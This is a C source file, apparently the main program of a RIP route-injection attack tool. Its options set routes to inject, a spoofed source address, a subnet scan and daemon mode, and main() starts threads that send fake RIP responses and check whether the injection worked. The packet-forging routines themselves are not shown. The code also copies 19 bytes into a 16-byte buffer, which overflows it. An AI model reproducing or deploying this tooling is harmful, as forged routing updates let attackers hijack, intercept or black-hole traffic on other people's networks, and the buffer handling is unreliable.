#include "fibc.h"

static struct neo_options opt[] = {

  {'-', 0, 0, NULL, "type:"},
  {'a', required_argument, "a/arbng", "file", "read routes from this file"},
  {'r', required_argument, "r/arb", "route", "route to inject"},
  {'b', required_argument, "b/arbng", "subnet", "subnet to scan"},
  {'n', required_argument, "rn/rnab", "netmask", "netmask of the route"},
  {'g', required_argument, "rg/rgab", "gateway", "default gateway"},
  {'m', required_argument, "rm/rmab", "metric", "metric to the route"},
  {'s', required_argument, "s/ar", "address", "spoofed source"},
  {'h', no_argument, NULL, NULL, "print help"},
  {'d', no_argument, "d/dc", NULL, "daemonize"},
  {'c', no_argument, "c/cd", NULL, "check injection"},
  {'f', no_argument, NULL, NULL, "force injection"},
  {0, 0, 0, 0, 0}
};

int
main (int argc, char **argv)
{
  unsigned long sp00f = 0;
  char ch, subnet[16];
  pthread_t pt, pt1;
  unsigned char opts[5] = { 0, 0, 0, 0, 0 };

  credits ();
  init_all ();

  neo_getopt (argc, argv, opt, OPT_NOW);
  while ((ch = neo_getopt (argc, argv, opt, OPT_DELAYED)) != EOF)
    {
      switch (ch)
	{
	case 'b':
	  strncpy (subnet, optarg, 19);
	  opts[3]++;
	  break;
	case 's':
	  sp00f = inet_addr (optarg);
	  opts[4]++;
	  break;
	case 'r':
	  routes[0][0] = inet_addr (optarg);
	  break;
	case 'm':
	  routes[3][0] = inet_addr (optarg);
	  break;
	case 'g':
	  routes[2][0] = inet_addr (optarg);
	  break;
	case 'n':
	  routes[1][0] = inet_addr (optarg);
	  break;
	case 'a':
	  printf ("Reading file %s...\n\n", optarg);
	  rip_file_read (optarg);
	  break;
	case 'h':
	  usage (argv[0]);
	  break;
	case 'd':
	  opts[0]++;
	  break;
	case 'f':
	  opts[1]++;
	  break;
	case 'c':
	  opts[2]++;
	  break;
	}
    }
  if (opts[3])
    {
      scan_net (subnet);
      exit (0);
    }
  if (!routes[0][0])
    usage (argv[0]);
  if (!opts[1])
    check_forward ();
  if (opts[4])
    localaddr = sp00f;
  if (opts[0])
    {
      if (fork ())
	exit (0);
    }
  else
    printf ("\nPress 'q' and Enter to exit\n\n");

  if (pthread_create (&pt, NULL, (void *) send_fake_rip_response, NULL))
    {
      fprintf (stderr, "\nerror while creating the pthread\n");
      exit (1);
    }
  if (opts[2])
    {
      if (pthread_create (&pt1, NULL, (void *) check_injection, NULL))
	{
	  fprintf (stderr, "\nerror while creating the pthread\n");
	  pthread_cancel (pt);
	  pthread_join (pt, NULL);
	  exit (1);
	}
    }
  while (1)
    {
      int cha;
      cha = getchar ();
      if ((char) cha == 'q')
	{
	  fprintf (stderr, "\nExiting...\n");
	  pthread_cancel (pt);
	  pthread_join (pt, NULL);
	  if (opts[2])
	    {
	      pthread_cancel (pt1);
	      pthread_join (pt1, NULL);
	    }
	  exit (0);
	}
    }

  return 0;
}
